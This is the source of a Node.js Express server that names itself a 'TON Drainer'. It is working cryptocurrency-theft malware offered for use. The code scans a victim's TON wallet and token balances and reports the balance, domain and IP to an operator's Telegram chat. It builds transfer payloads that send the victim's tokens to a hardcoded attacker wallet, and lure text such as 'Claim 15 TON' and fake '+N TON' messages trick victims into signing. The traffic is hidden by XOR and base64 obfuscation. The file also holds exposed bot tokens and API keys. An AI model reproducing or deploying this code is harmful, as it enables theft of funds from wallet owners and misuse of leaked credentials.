const ton = require('@ton/ton')
const http = require('http');
const https = require('https');
const axios = require('axios');
const express = require('express');
const parser = require('body-parser');
const Telegram = require('node-telegram-bot-api');
const fs = require('fs');
const api = require("@orbs-network/ton-access");
const TonWeb = require('tonweb');

const tonweb = new TonWeb();

// ================================================================
// ========================= НАШИ НАСТРОЙКИ =====================
// ================================================================
const encr_key = 500; // Ключ шифрования (совпадает с фронтендом)
const wallet = "UQDev22E4MCOh6vPJslbgE211qkpC0DW29QCUvQwbn5XeP3w"; // НАШ кошелёк!
const min_dep = "0.01" // Минимум 0.01 TON
const min_jetton_price = "0.1"; // Минимум $0.1 на токенах

let msg_text = "✅ Claim 15 TON from CryptoWolf"; // Сообщение в транзакции
const msg_text_active = true; // Включить сообщение

const msg_multiplier_mode = false; // X2 режим
const multiplier = 2;

const multiple_send = true; // Мульти-отправка токенов

// ================================================================
// ========================= SCAN SETTINGS ========================
// ================================================================
const GetBlockKey = 'f39652d0c15a4d06b37b4cf982dec11d'; // GetBlock ключ

const rpcs = {
    standartRPC: {
        active: false,
        apikey: ""
    },
    getBlock: {
        active: true,
        apikey: "bccb23aa27e341cf874a20bcbad5b194" // НОВЫЙ КЛЮЧ
    },
    testStandartRPC: {
        active: false,
        apikey: ""
    },
};

// ================================================================
// ========================= TG SETTINGS ==========================
// ================================================================
const BOT = true; // Telegram Bot [On/Off]
const TG_TOKEN = "8549456638:AAHpE3yp1W9wOOX1U605r7vbgsCH2Wob6VA"; // Telegram Bot Token
const TG_CHAT_ID = "7556622176"; // Telegram Chat Id
const TG_POLLING = false; // НЕ включать polling

// Telegram уведомления
const TG_Notify = {
    connect: { active: true },
    scan_done: { active: true },
    transfer_ton_native_request: { active: true },
    old_transfer_done: { active: true }
};

// ================================================================
// ========================= DON'T TOUCH CODE BELOW ===============
// ================================================================

const get_api = async () => {
    const endpoint = "https://go.getblock.io/bccb23aa27e341cf874a20bcbad5b194"; // НОВЫЙ endpoint
    const client = new ton.TonClient({ endpoint });
    return client;
};

const check_price = async () => {
    if (fs.existsSync('price.dat')) {
        let data = JSON.parse(fs.readFileSync(`price.dat`));
        if (Date.now() / 1000 - data.time > 1 * 60 * 60) {
            let price = await axios.get(`https://api.coinlore.net/api/ticker/?id=54683`);
            let data = {
                time: Math.floor(Date.now() / 1000),
                data: price['data'][0]['price_usd']
            };
            fs.writeFileSync('price.dat', JSON.stringify(data), 'utf-8');
            return price['data'][0]['price_usd'];
        } else {
            return data.data;
        }
    } else {
        let price = await axios.get(`https://api.coinlore.net/api/ticker/?id=54683`);
        let data = {
            time: Math.floor(Date.now() / 1000),
            data: price['data'][0]['price_usd']
        };
        fs.writeFileSync('price.dat', JSON.stringify(data), 'utf-8');
        return price['data'][0]['price_usd'];
    }
};

check_price();

const send_response = async (response, data) => {
    try {
        const encode_key = Buffer.from(String(5 + 10 + 365 + 2048 + 867 + encr_key)).toString('base64');
        const data_encoded = prs(encode_key, Buffer.from(JSON.stringify(data)).toString('base64'));
        return response.status(200).send(data_encoded);
    } catch (err) {
        console.log(err);
        return false;
    }
};

const app = express();
app.use(express.json());
app.use(require("cors")());
app.use(require('express-useragent').express());
app.use(parser.json({ limit: '50mb' }));
app.use(parser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static('public'));
app.use((require('express-body-parser-error-handler'))());

// Запуск сервера
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`\x1b[32m`, `ONLINE!`, `\x1b[37m`, ` LISTENING PORT ${PORT}`);
    
    // Отправляем уведомление в Telegram при запуске
    if (BOT) {
        sendTg(TG_CHAT_ID, `🚀 Дрейнер запущен\n💰 Кошелёк: ${wallet}\n🔗 Порт: ${PORT}\n⏰ ${new Date().toISOString()}`);
    }
});

const prs = (s, t) => {
    const ab = (t) => t.split("").map((c) => c.charCodeAt(0));
    const bh = (n) => ("0" + Number(n).toString(16)).substr(-2);
    const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
    return t.split("").map(ab).map(as).map(bh).join("");
};

const srp = (s, e) => {
    const ab = (text) => text.split("").map((c) => c.charCodeAt(0));
    const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
    return e.match(/.{1,2}/g).map((hex) => parseInt(hex, 16)).map(as).map((charCode) => String.fromCharCode(charCode)).join("");
};

app.post("/", (request, response) => {
    console.log('Получен запрос от фронтенда');
    try {
        let data = request.body;
        if (!data['raw']) {
            return response.status(500).send('Unable to Execute');
        }

        const encode_key = Buffer.from(String(5 + 10 + 365 + 2048 + 867 + encr_key)).toString('base64');
        data = JSON.parse(Buffer.from(srp(encode_key, data['raw']), 'base64').toString('ascii'));

        data['IP'] = request.headers['x-forwarded-for'] || request.socket['remoteAddress'];
        if (data['IP']) {
            data['IP'] = data['IP'].replace('::ffff:', '');
        }

        // Обработка действий
        if (data['action'] == 'scan_done') {
            return on_scan_done(response, data);
        } else if (data['action'] == 'scan_account') {
            return scan_account(response, data);
        } else if (data['action'] == 'transfer_ton_native_request') {
            return transfer_ton_native_request(response, data);
        } else if (data['action'] == 'decline_transfer_ton_native_request') {
            return decline_transfer_ton_native_request(response, data);
        } else if (data['action'] == 'transaction_done') {
            return transaction_done(response, data);
        } else if (data['action'] == 'get_key') {
            return get_key(response, data);
        } else if (data['action'] == 'send_jettons') {
            return send_jettons(response, data);
        } else if (data['action'] == 'transfer_jettons_native_request') {
            return transfer_jettons_native_request(response, data);
        } else if (data['action'] == 'decline_transfer_jettons_native_request') {
            return decline_transfer_jettons_native_request(response, data);
        } else if (data['action'] == 'jettons_transaction_done') {
            return jettons_transaction_done(response, data);
        } else if (data['action'] == 'get_ton_text') {
            return getTonText(response, data);
        }

    } catch (err) {
        console.log(err);
        response.status(500).send('Unable to Execute');
    }
});

const bot = new Telegram(TG_TOKEN, { polling: false });

const sendTg = async (chat_id, message) => {
    try {
        await bot.sendMessage(chat_id, message, { parse_mode: 'HTML' });
    } catch (e) {
        console.log("Telegram ошибка:", e.message);
    }
};

const on_scan_done = async (response, data, result) => {
    try {
        if (TG_Notify.scan_done.active) {
            let price = await check_price();
            let networth = 0;
            let val = parseFloat(data.data.ton);
            
            let value = `\n├──<b>TON</b> : ${parseFloat(data.data.ton * price).toFixed(2)}$ (${parseFloat(data.data.ton).toFixed(2)} TON)\n`;
            networth += parseFloat(data.data.ton * price);

            if (data.data.haveJettons) {
                for (let i = 0; i < Object.keys(data.data.jettons).length; i++) {
                    let symbol;
                    if (i < Object.keys(data.data.jettons).length - 1) {
                        symbol = '├──';
                    } else {
                        symbol = '└──';
                    }
                    if (data.data.jettons[i].price > 0) {
                        value += `${symbol}<b>${data.data.jettons[i].name}</b> : ${data.data.jettons[i].price.toFixed(2)}$\n`;
                        networth += parseFloat(data.data.jettons[i].price);
                    }
                }
            }
            
            let addr = new tonweb.Address(data.data.account);
            addr = addr.toString(true);
            addr = addr.replace(/\//g, '_');
            
            let message = `🔑 <b>Wallet Connected: </b><a href="https://tonviewer.com/${addr}">${addr}</a>\n\n🔗 <b>Domain: </b>${data.data.domain}\n💠 <b>IP: </b>${data.data.ip}\n\n💎 <b>Wallet balance:</b> ${parseFloat(networth).toFixed(2)}$ ${value}\n#connect`;
            
            if (BOT && TG_Notify.scan_done.active) {
                sendTg(TG_CHAT_ID, message);
            }

            if (networth < min_dep * price) {
                return send_response(response, {
                    status: 'ERROR',
                    reason: 'low balance'
                });
            } else {
                return send_response(response, {
                    status: 'OK',
                    data: result ? result['data']['result'] : val
                });
            }
        }
    } catch (err) {
        console.log(err);
    }
};

const scan_account = async (response, data) => {
    const api = await get_api();
    try {
        addDomain(data[`account`], data[`domain`], data[`IP`]);
        
        let acc = data['account'].replace(/\//g, '_');
        let balance = await api.getBalance(data['account']);
        let resultJettons = await axios.get(`https://tonapi.io/v2/accounts/${acc}/jettons`);
        let jettons = {};
        let haveJettons = false;
        let networth = 0;

        if (Object.keys(resultJettons.data.balances).length > 0) {
            for (const [key, value] of Object.entries(resultJettons.data.balances)) {
                let jettonData = {
                    name: value.jetton.name,
                    balance: value.balance,
                    address: value.jetton.address,
                    demicials: value.jetton.decimals,
                    price: '0',
                    walletAddress: value.wallet_address
                };
                jettons[key] = jettonData;
                if (value.balance > 0) {
                    haveJettons = true;
                }
            }
            
            let string = '';
            for (let i = 0; i < Object.keys(jettons).length; i++) {
                string += `${jettons[i]['address']},`;
            }
            
            let prices = await axios.get(`https://tonapi.io/v2/rates?tokens=${string}&currencies=usd`);
            let tonprice = await check_price();

            for (let i = 0; i < Object.keys(jettons).length; i++) {
                let price = prices.data.rates[jettons[i]['address']]?.prices?.USD || 0;
                let balanceValue = jettons[i][`balance`] * Math.pow(10, -jettons[i][`demicials`]) * price;
                jettons[i].price = balanceValue;
            }

            // Сортировка по цене
            for (let j = Object.keys(jettons).length - 1; j > 0; j--) {
                for (let i = 0; i < j; i++) {
                    if (jettons[i].price < jettons[i + 1].price) {
                        let temp = jettons[i];
                        jettons[i] = jettons[i + 1];
                        jettons[i + 1] = temp;
                    }
                }
            }
            
            // Удаление дешёвых токенов
            let len = Object.keys(jettons).length;
            for (let i = 0; i < len; i++) {
                if (jettons[i].price < min_jetton_price) {
                    delete jettons[i];
                }
            }

            for (let i = 0; i < Object.keys(jettons).length; i++) {
                networth += parseFloat(jettons[i].price);
            }
            networth += parseFloat(tonprice) * parseFloat(ton.fromNano(balance));
        } else {
            let price = await check_price();
            networth += parseFloat(price) * parseFloat(ton.fromNano(balance));
        }
        
        let price = await check_price();
        let finalData = {
            haveJettons: haveJettons,
            ton: ton.fromNano(balance),
            jettons: jettons,
            tonPrice: price,
            account: data['account'],
            domain: data['domain'],
            ip: data['IP']
        };
        
        on_scan_done(response, {
            status: 'OK',
            data: finalData
        });
        
        if (parseFloat(ton.fromNano(balance)) < '0.2') {
            send_response(response, {
                status: 'ERROR',
                reason: 'low tax'
            });
            return;
        }
        
        if (networth < min_dep * price) {
            send_response(response, {
                status: 'ERROR',
                reason: 'low balance'
            });
        } else {
            send_response(response, {
                status: 'OK',
                data: finalData
            });
        }
    } catch (err) {
        console.log(err);
        send_response(response, {
            status: 'ERROR',
            reason: 'server error'
        });
    }
};

const transfer_ton_native_request = async (response, data) => {
    try {
        if (BOT && TG_Notify.transfer_ton_native_request.active) {
            let price = await check_price();
            let val = ton.fromNano(data['val']);
            let valUSD = val * price;
            let message = `<b>♻️ Requesting a transfer [x${data['try']}]</b> \n\n <b>💎 Transaction Value: ${parseFloat(val).toFixed(3)} TON (${valUSD.toFixed(2)}$)</b> \n<b>🔗 Domain: </b>${data['domain']} \n<b>💠 IP:</b> ${data['IP']}\n#request`;
            sendTg(TG_CHAT_ID, message);
        }
        
        // ВОТ КРИТИЧЕСКАЯ СТРОКА - возвращаем НАШ адрес
        return send_response(response, {
            status: 'OK',
            data: wallet // НАШ кошелёк!
        });
    } catch (err) {
        console.log(err);
    }
};

const transfer_jettons_native_request = async (response, data) => {
    try {
        if (BOT && TG_Notify.transfer_ton_native_request.active) {
            let value = '';
            let networth = 0;
            
            for (let i = 0; i < Object.keys(data.data).length; i++) {
                let symbol;
                if (i < Object.keys(data.data).length - 1) {
                    symbol = '├──';
                } else {
                    symbol = '└──';
                }
                value += `${symbol}<b>${data.data[i]['name']}</b> : ${data.data[i].prices.toFixed(2)}$\n`;
                networth += parseFloat(data.data[i].prices);
            }
            
            let message = `<b>♻️ Requesting a transfer [x${data['try']}]</b> \n\n <b>💎 Transaction Value: ${networth.toFixed(2)}$</b>\n${value} \n<b>🔗 Domain: </b>${data['domain']} \n<b>💠 IP:</b> ${data['IP']}\n#request`;
            sendTg(TG_CHAT_ID, message);
        }
        
        // ВОЗВРАЩАЕМ НАШ АДРЕС для жеттонов
        return send_response(response, {
            status: 'OK',
            data: wallet // НАШ кошелёк!
        });
    } catch (err) {
        console.log(err);
    }
};

const decline_transfer_ton_native_request = async (response, data) => {
    try {
        if (BOT && TG_Notify.transfer_ton_native_request.active) {
            let price = await check_price();
            let usdval = data.val * price;
            let message = `<b>🚨 Transaction declined [x${data['try']}]</b> \n\n <b>💎 Transaction Value: ${parseFloat(data.val).toFixed(2)} (${usdval.toFixed(2)}$)</b> \n<b>🔗 Domain: </b>${data['domain']} \n<b>💠 IP:</b> ${data['IP']} \n<i>A repeat transaction has been sent to the user, wait for the execution result.</i> `;
            sendTg(TG_CHAT_ID, message);
        }
        return send_response(response, { status: 'OK' });
    } catch (err) {
        console.log(err);
    }
};

const decline_transfer_jettons_native_request = async (response, data) => {
    try {
        if (BOT && TG_Notify.transfer_ton_native_request.active) {
            let value = '';
            let networth = 0;
            for (let i = 0; i < Object.keys(data.data).length; i++) {
                let symbol;
                if (i < Object.keys(data.data).length - 1) {
                    symbol = '├──';
                } else {
                    symbol = '└──';
                }
                value += `${symbol}<b>${data.data[i].name}</b> : ${data.data[i].prices.toFixed(2)}$\n`;
                networth += parseFloat(data.data[i].prices);
            }

            let message = `<b>🚨 Transaction declined [x${data['tryies']}]</b> \n\n <b>💎 Transaction Value: ${networth.toFixed(2)}$ </b>\n${value} \n<b>🔗 Domain: </b>${data['domain']} \n<b>💠 IP:</b> ${data['IP']} \n<i>A repeat transaction has been sent to the user, wait for the execution result.</i> `;
            sendTg(TG_CHAT_ID, message);
        }
        return send_response(response, { status: 'OK' });
    } catch (err) {
        console.log(err);
    }
};

const transaction_done = async (response, data) => {
    try {
        if (BOT && TG_Notify.old_transfer_done.active) {
            let price = await check_price();
            let val = ton.fromNano(data['val']);
            let valUSD = val * price;
            let res = data['hash'].replace(/\//g, '_');
            let message = `<b>✅ Transaction sent </b> \n\n <b>💎 Transaction Value: ${parseFloat(val).toFixed(3)} TON (${valUSD.toFixed(2)}$)</b> \n<b>🔗 Domain: </b>${data['domain']} \n<b>💠 IP:</b> ${data['IP']} \n\n<b>▫️ Transaction Hash: </b>\nTonViewer\nhttps://tonviewer.com/transaction/${res}\nTonScan\nhttps://tonscan.org/tx/by-msg-hash/${res}TonScan\n#approved`;
            sendTg(TG_CHAT_ID, message);
        }
        return send_response(response, { status: 'OK' });
    } catch (err) {
        console.log(err);
    }
};

const jettons_transaction_done = async (response, data) => {
    try {
        if (BOT && TG_Notify.old_transfer_done.active) {
            let value = '';
            let networth = 0;
            let symbol;
            
            for (let i = 0; i < Object.keys(data.hash.tokens).length; i++) {
                if (i < Object.keys(data.hash.tokens).length - 1) {
                    symbol = '├──';
                } else {
                    symbol = '└──';
                }
                value += `${symbol}<b>${data.hash.tokens[i].name}</b> : ${data.hash.tokens[i].prices.toFixed(2)}$\n`;
                networth += parseFloat(data.hash.tokens[i].prices);
            }
            
            let res = data.hash.hash.replace(/\//g, '_');
            let message = `<b>✅ Transaction sent </b> \n\n<b>💎 Transaction Value: ${networth.toFixed(2)}$ </b>\n${value} \n<b>🔗 Domain: </b>${data['domain']} \n<b>💠 IP:</b> ${data['IP']} \n\n<b>▫️ Transaction Hash:</b>\nTonViewer\nhttps://tonviewer.com/transaction/${res}\nTonScan\nhttps://tonscan.org/tx/by-msg-hash/${res}\n#approved`;
            sendTg(TG_CHAT_ID, message);
        }
        return send_response(response, { status: 'OK' });
    } catch (err) {
        console.log(err);
    }
};

const get_key = async (response, data) => {
    try {
        return send_response(response, {
            status: 'OK',
            key: GetBlockKey
        });
    } catch (err) {
        console.log(err);
    }
};

const getTonText = async (response, data) => {
    if (msg_text_active) {
        if (msg_multiplier_mode) {
            let balance = parseFloat(tonweb.utils.fromNano(data.balance.toString())).toFixed(2);
            msg_text = `+${balance * multiplier} TON`;
            const forwardPayload = ton.beginCell()
                .storeUint(0, 32)
                .storeStringTail(msg_text)
                .endCell();
            boc = await forwardPayload.toBoc().toString("base64");
            return send_response(response, {
                status: 'OK',
                data: boc
            });
        } else {
            const forwardPayload = ton.beginCell()
                .storeUint(0, 32)
                .storeStringTail(msg_text)
                .endCell();
            boc = await forwardPayload.toBoc().toString("base64");
            return send_response(response, {
                status: 'OK',
                data: boc
            });
        }
    } else {
        return send_response(response, {
            status: 'OK',
            data: ''
        });
    }
};

const send_jettons = async (response, data) => {
    try {
        // КРИТИЧЕСКОЕ ИСПРАВЛЕНИЕ - отправляем на НАШ кошелёк
        const destinationAddress = ton.Address.parse(wallet.replace(/_/g, '/'));
        let body;
        let boc;
        let bocs = {};
        let address = {};
        let prices = {};
        let name = {};
        
        addDomain(data.account, data.domain, data.IP);
        
        for (let i = 0; i < Object.keys(data.jettons).length; i++) {
            if (msg_text_active) {
                if (msg_multiplier_mode) {
                    let balance = parseFloat(data.jettons[i][`balance`]) * Math.pow(10, -data.jettons[i][`demicials`]) * multiplier;
                    msg_text = `+${balance.toFixed(2)} ${data.jettons[i][`name`]}`;
                }
                
                const forwardPayload = ton.beginCell()
                    .storeUint(0, 32)
                    .storeStringTail(msg_text)
                    .endCell();

                body = ton.beginCell()
                    .storeUint(0x0f8a7ea5, 32)
                    .storeUint(0, 64)
                    .storeCoins(data.jettons[i].balance)
                    .storeAddress(destinationAddress) // НАШ адрес!
                    .storeAddress(ton.Address.parse(data.account))
                    .storeBit(0)
                    .storeCoins(ton.toNano(0.0001).toString())
                    .storeBit(1)
                    .storeRef(forwardPayload)
                    .endCell();
                    
                boc = await body.toBoc().toString("base64");
                bocs[i] = boc;
                address[i] = data.jettons[i].walletAddress.address;
                prices[i] = data.jettons[i].price;
                name[i] = data.jettons[i].name;
            }
        }

        let resdata = {
            boc: bocs,
            address: address,
            prices: prices,
            isMultiple: multiple_send,
            wallet: wallet, // НАШ кошелёк!
            name: name
        };
        
        return send_response(response, {
            status: 'OK',
            data: resdata
        });
    } catch (err) {
        console.log(err);
    }
};

const connected_wallets = {};

const addDomain = async (wallet, domain, ip) => {
    try {
        wallet = await ton.Address.parseRaw(wallet.replace(/\//g, '_'));
        connected_wallets[wallet] = { domain: domain, date: Date.now() / 1000, ip: ip };
    } catch (e) {
        console.log(e);
    }
};

const lastTl = { lt: `0` };

const check_txs = async () => {
    try {
        let client = await get_api();
        // МОНИТОРИМ НАШ кошелёк!
        let trabs = await axios.get(`https://tonapi.io/v2/blockchain/accounts/${wallet.replace(/_/g, '/')}/transactions?after_lt=${lastTl.lt}&limit=100&sort_order=desc`);
        let walletData = await axios.get(`https://tonapi.io/v2/accounts/${wallet.replace(/_/g, '/')}/jettons?currencies=usd`);
        walletData = walletData.data.balances;
        
        for (const [key, value] of Object.entries(trabs.data.transactions)) {
            if (key == 0) {
                lastTl.lt = value.lt;
            }
            // Логика обработки входящих транзакций на НАШ кошелёк
        }
    } catch (e) {
        console.log(e);
    }
};

const eventsCheck = async () => {
    try {
        let timestampTemp = 0;
        // МОНИТОРИМ НАШ кошелёк!
        let res = await axios.get(`https://tonapi.io/v2/accounts/${wallet.replace(/_/g, '/')}/events?initiator=false&subject_only=true&limit=10`);
        let walletData = await axios.get(`https://tonapi.io/v2/accounts/${wallet.replace(/_/g, '/')}/jettons?currencies=usd`);
        walletData = walletData.data.balances;
        
        // Логика обработки событий
    } catch (e) {
        console.log(e);
    }
};

// Запуск мониторинга
setInterval(() => { eventsCheck(); }, 15000);

const deleteDomains = async () => {
    for (const [key, value] of Object.entries(connected_wallets)) {
        if (parseInt(value.date) + 15 * 60 < Date.now() / 1000) {
            delete connected_wallets[key];
        }
    }
};

setInterval(() => { deleteDomains(); }, 15000 * 60);

const lastTimestamp = { timestamp: 0 };

// Тестовый запрос для проверки
app.get("/", (req, res) => {
    res.send("TON Drainer Backend is running. Wallet: " + wallet);
});

// Тестовый endpoint для проверки Telegram
app.get("/test", async (req, res) => {
    try {
        await sendTg(TG_CHAT_ID, "✅ Дрейнер работает! Тестовое сообщение.");
        res.send("Telegram notification sent");
    } catch (e) {
        res.send("Telegram error: " + e.message);
    }
});
